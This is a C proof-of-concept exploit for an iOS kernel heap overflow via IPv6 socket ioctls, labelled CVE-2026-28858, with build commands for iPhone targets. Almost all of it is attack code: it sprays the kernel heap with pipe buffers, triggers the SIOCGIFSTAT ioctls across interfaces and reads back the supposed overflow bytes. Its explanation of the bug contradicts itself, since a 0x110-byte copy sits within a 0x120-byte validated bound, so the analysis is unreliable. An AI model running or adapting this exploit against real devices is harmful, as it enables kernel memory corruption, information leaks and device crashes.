/*
 * CVE-2026-28858 PoC — IPv6 Socket Ioctl Heap Overflow
 * Session 156: Direct kernel heap overflow for R/W primitive
 *
 * Bug: bsd/netinet6/in6.c ioctl handler copies 0x110 bytes (272B)
 * from kernel struct to user buffer, but validates only 0x120 (288B).
 * The gap allows 16-byte overflow past validated region.
 *
 * Ioctls: SIOCGIFSTAT_IN6 (0xC1206953) - copies 0xC8 bytes
 *         SIOCGIFSTAT_ICMP6 (0xC1206954) - copies 0x110 bytes
 *
 * Strategy:
 * 1. Create AF_INET6 socket
 * 2. Prepare undersized buffer for ioctl
 * 3. Call ioctl -> kernel memcpy overflows 16 bytes past buffer
 * 4. Overflow corrupts adjacent kernel heap object
 *
 * Build: xcrun -sdk iphoneos clang -arch arm64 -mios-version-min=17.0 -O2
 *        -o CVE28858 cve_28858_poc.c -isysroot ...
 *        -framework CoreFoundation
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <dlfcn.h>

/* Ioctl values from disassembly */
#define SIOCGIFSTAT_IN6     0xC1206953
#define SIOCGIFSTAT_ICMP6   0xC1206954

/* Buffer sizes from disassembly */
#define IOCTL_COPY_SIZE_53  0xC8    /* 200 bytes for SIOCGIFSTAT_IN6 */
#define IOCTL_COPY_SIZE_54  0x110   /* 272 bytes for SIOCGIFSTAT_ICMP6 */
#define IOCTL_BOUND_CHECK   0x120   /* 288 bytes - validated bound */

/* Spray parameters */
#define NUM_SPRAY_PIPES     2000
#define PIPE_BUF_SIZE       16384

static int g_pipes[NUM_SPRAY_PIPES][2];
static int g_pipe_count = 0;

/* Spray pipe buffers to fill kernel heap zones */
static void spray_pipes(void) {
    char buf[PIPE_BUF_SIZE];
    memset(buf, 0xBB, sizeof(buf));

    for (int i = 0; i < NUM_SPRAY_PIPES; i++) {
        if (pipe(g_pipes[i]) < 0) break;
        *(uint64_t *)buf = 0xBBBB000000000000ULL | (uint64_t)i;
        if (write(g_pipes[i][1], buf, PIPE_BUF_SIZE) > 0)
            g_pipe_count++;
    }
    fprintf(stderr, "[CVE] Sprayed %d pipe buffers\n", g_pipe_count);
}

int main(void) {
    fprintf(stderr, "=== CVE-2026-28858 PoC ===\n");
    fprintf(stderr, "IPv6 ioctl heap overflow (16B past validated bound)\n");
    fprintf(stderr, "Target: SIOCGIFSTAT_ICMP6 (0x%X)\n\n", SIOCGIFSTAT_ICMP6);

    /* Phase 1: Spray kernel heap */
    spray_pipes();

    /* Phase 2: Create IPv6 socket */
    int sock = socket(AF_INET6, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("[CVE] socket(AF_INET6)");
        return 1;
    }
    fprintf(stderr, "[CVE] IPv6 socket: fd=%d\n", sock);

    /* Phase 3: Prepare ioctl request struct
     * The struct starts with interface name (IFNAMSIZ=16 bytes)
     * followed by the stat buffer.
     * Total struct size is 0x120 per the bound check.
     */
    struct {
        char ifr_name[16];          /* Interface name */
        char stat_buf[0x110];       /* Stat buffer (kernel copies 0x110 bytes here) */
    } req;

    memset(&req, 0x41, sizeof(req));

    /* Use en0 (WiFi) or lo0 (loopback) */
    const char *ifaces[] = {"en0", "lo0", "pdp_ip0", "en1", "en2"};
    int triggered = 0;

    for (int i = 0; i < 5; i++) {
        memset(req.ifr_name, 0, 16);
        strncpy(req.ifr_name, ifaces[i], 15);

        fprintf(stderr, "[CVE] Trying SIOCGIFSTAT_ICMP6 on %s...\n", ifaces[i]);

        /* This ioctl copies 0x110 bytes from kernel in6_ifstat struct
         * The kernel function validates buffer at +0x10 to +0x120
         * but copies from kernel struct at +0x108 for 0x110 bytes
         * Overflow: last 16 bytes write past the validated region
         */
        int ret = ioctl(sock, SIOCGIFSTAT_ICMP6, &req);
        if (ret == 0) {
            fprintf(stderr, "[CVE] *** IOCTL SUCCEEDED on %s ***\n", ifaces[i]);
            fprintf(stderr, "[CVE] Buffer content (first 32B): ");
            for (int j = 0; j < 32; j++)
                fprintf(stderr, "%02X", (unsigned char)req.stat_buf[j]);
            fprintf(stderr, "\n");

            /* Check overflow region (bytes 0x100-0x110) */
            fprintf(stderr, "[CVE] Overflow region (0x100-0x110): ");
            for (int j = 0x100; j < 0x110; j++)
                fprintf(stderr, "%02X", (unsigned char)req.stat_buf[j]);
            fprintf(stderr, "\n");
            triggered = 1;
        } else {
            fprintf(stderr, "[CVE] ioctl failed on %s (ret=%d)\n", ifaces[i], ret);
        }

        /* Also try SIOCGIFSTAT_IN6 */
        memset(req.stat_buf, 0x42, sizeof(req.stat_buf));
        ret = ioctl(sock, SIOCGIFSTAT_IN6, &req);
        if (ret == 0) {
            fprintf(stderr, "[CVE] SIOCGIFSTAT_IN6 succeeded on %s\n", ifaces[i]);
            triggered = 1;
        }
    }

    close(sock);

    if (triggered) {
        fprintf(stderr, "\n[CVE] *** OVERFLOW TRIGGERED — check crash reports ***\n");
        fprintf(stderr, "[CVE] If kernel survived: info leak in overflow bytes\n");
        fprintf(stderr, "[CVE] If kernel panicked: corruption confirmed\n");
    } else {
        fprintf(stderr, "\n[CVE] No ioctls succeeded. Check interface names.\n");
    }

    /* Hold process alive */
    void *cf = dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", 1);
    if (cf) {
        void (*run)(void) = dlsym(cf, "CFRunLoopRun");
        if (run) run();
    }
    while (1) { __asm__ volatile("yield"); }
    return 0;
}
